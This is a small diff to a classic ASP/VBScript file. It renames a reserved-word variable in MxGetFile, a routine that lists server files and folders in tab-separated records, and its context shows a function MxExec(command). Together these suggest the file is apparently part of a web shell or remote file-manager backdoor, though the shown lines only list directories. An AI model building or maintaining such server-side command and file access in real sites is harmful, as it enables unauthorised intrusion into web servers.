@@ -125,7 +125,7 @@ Function MxExec(command)
 End Function
 
 Function MxGetFile(dir)
-    Dim fso, folder, f, sub, nl, text, path
+    Dim fso, folder, f, subFolder, nl, text, path
     nl = Chr(13) & Chr(10)
     On Error Resume Next
     Set fso = Server.CreateObject("Scripting.FileSystemObject")
@@ -141,8 +141,8 @@ Function MxGetFile(dir)
     For Each f In folder.Files
         text = text & f.Name & Chr(9) & "1" & Chr(9) & f.DateLastModified & Chr(9) & f.Size & Chr(9) & "RW" & nl
     Next
-    For Each sub In folder.SubFolders
-        text = text & sub.Name & Chr(9) & "0" & Chr(9) & sub.DateLastModified & Chr(9) & "0" & Chr(9) & "RW" & nl
+    For Each subFolder In folder.SubFolders
+        text = text & subFolder.Name & Chr(9) & "0" & Chr(9) & subFolder.DateLastModified & Chr(9) & "0" & Chr(9) & "RW" & nl
     Next
     MxGetFile = text
 End Function
